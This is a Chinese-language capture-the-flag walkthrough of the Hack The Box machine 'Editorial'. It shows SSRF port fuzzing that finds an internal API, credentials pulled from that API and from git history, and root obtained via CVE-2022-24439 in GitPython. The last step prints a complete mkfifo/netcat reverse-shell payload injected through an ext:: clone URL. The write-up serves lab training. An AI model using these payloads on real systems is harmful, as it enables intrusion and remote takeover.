###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Editorial

```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.31.216 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.31.216:22
Open 10.129.31.216:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

先把`editorial.htb`加入`/etc/hosts`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.31.216   editorial.htb
```

fuff掃
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://editorial.htb/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 

about                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 385ms]
upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 302ms]
                        [Status: 200, Size: 8577, Words: 1774, Lines: 177, Duration: 302ms]
```

前往`http://editorial.htb/upload`之後可以看到可以輸入`cover url`的地方，用burp進行查看之後
```
POST /upload-cover HTTP/1.1

Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------31563700311749788861118574668
Content-Length: 357
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload

-----------------------------31563700311749788861118574668
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1/
-----------------------------31563700311749788861118574668
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream
-----------------------------31563700311749788861118574668--
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 04 Sep 2024 06:34:14 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 61

/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

看起來可以存取server內的東西，看能不能查看別的port，利用ffuf
```
## request.txt

POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------31563700311749788861118574668
Content-Length: 360
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload

-----------------------------31563700311749788861118574668
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ/
-----------------------------31563700311749788861118574668
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream
-----------------------------31563700311749788861118574668--


┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -request-proto http -w port.txt -fs 61

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 305ms]
```

5000port好像有些什麼`http://127.0.0.1:5000/`

![Editorial_1.png](picture/Editorial_1.png)

會下載一個檔案
```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

輸入`http://127.0.0.1:5000/api/latest/metadata/messages/authors`
```
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

得username`dev`密碼`dev080217_devAPI!@`，ssh登入之後在`/home/dev`可得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh dev@10.129.31.216
dev@10.129.31.216's password: dev080217_devAPI!@

dev@editorial:~$ cat user.txt
69238df3a16f725aabd4e16e4b280491
```

到`/home/dev/apps`裡面有看到一個`.git`，查看logs
```
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.

```

查看紀錄
```
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

裡面有一個原本的user是`prod`然後密碼是`080217_Producti0n_2023!@`，看能不能切成`prod`，之後查看`sudo -l`
```
dev@editorial:~/apps$ su prod
Password: 080217_Producti0n_2023!@
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

查看`/opt/internal_apps/clone_changes/clone_prod_change.py`
```python
prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py 
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

他有使用`git`查看`pip3 list`
```
prod@editorial:/opt/internal_apps/clone_changes$ pip3 list
Package               Version
--------------------- ----------------
...
GitPython             3.1.29
...
```

google搜尋[CVE-2022-24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858?source=post_page-----0fba80ca64e8--------------------------------)然後用他用reverse就可得到root，得root之後在/root得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c rm% /tmp/f;mkfifo% /tmp/f;cat% /tmp/f|/bin/sh% -i% 2>&1|nc% 10.10.14.70% 4444% >/tmp/f"

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@editorial:/opt/internal_apps/clone_changes# cd /root
root@editorial:~# cat root.txt
f8c5fd314876c1218e99f1171388092b
```